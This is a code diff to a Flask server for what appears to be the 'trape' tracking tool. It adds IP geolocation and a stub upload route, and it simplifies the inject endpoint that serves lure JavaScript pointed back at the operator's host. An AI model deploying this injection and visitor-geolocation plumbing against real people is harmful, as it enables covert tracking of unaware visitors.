@@ -19,6 +19,7 @@ from flask_cors import CORS
 from trape import Trape
 import urllib
 from core.db import Database
+from core import geoip
 
 # Main parts, to generate relationships among others
 trape = Trape(1)
@@ -72,11 +73,7 @@ def home_get_dat():
     rows = db.sentences_stats('get_online', vId)
     o = rows[0][0]
 
-    injectCode = ''
-    if trape.nGrokUrl != '':
-        injectCode = str(trape.nGrokUrl) + '/' + str(trape.injectURL)
-    else:
-        injectCode = str(trape.localIp) + ':' + str(trape.app_port) + '/' + str(trape.injectURL)
+    injectCode = str(trape.localIp) + ':' + str(trape.app_port) + '/' + str(trape.injectURL)
 
     return json.dumps({'status' : 'OK', 'd' : d, 'n' : n, 'c' : c, 's' : s, 'o' : o, "ic" : injectCode})
 
@@ -134,14 +131,9 @@ def inject():
     codeToInject = f_codeToInject.read().replace('[LIBS_SRC]', trape.JSFiles[1]['src']).replace('[BASE_SRC]', trape.JSFiles[0]['src']).replace('[LURE_SRC]', trape.JSFiles[3]['src']).replace('[CUSTOM_SRC]', trape.JSFiles[6]['src'])
     f_codeToInject.close()
 
-    server_code = ''
-    if trape.nGrokUrl != '':
-        server_code = str(trape.nGrokUrl) 
-    else:
-        server_code = str(trape.localIp) + ':' + str(trape.app_port) 
+    server_code = str(trape.localIp) + ':' + str(trape.app_port)
 
     codeToInject = codeToInject.replace('[HOST_ADDRESS]', server_code)
-    codeToInject = codeToInject.replace('[YOUR_GMAPS_API_KEY]', trape.gmaps)
     return codeToInject
 
 @app.route("/static/js/<JSFile>")
@@ -174,3 +166,15 @@ def style_redirect(CSSFile):
 def file_redirect(File):
     uploads = os.path.join(os.getcwd(), './')
     return send_from_directory(directory=uploads, filename=File)
+
+@app.route("/geoip")
+def geoip_lookup():
+    ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.environ['REMOTE_ADDR'])
+    if ',' in ip:
+        ip = ip.split(',')[0].strip()
+    data = geoip.lookup(ip)
+    return json.dumps(data)
+
+@app.route("/speedtest_upload", methods=["POST"])
+def speedtest_upload():
+    return json.dumps({'status': 'ok'})
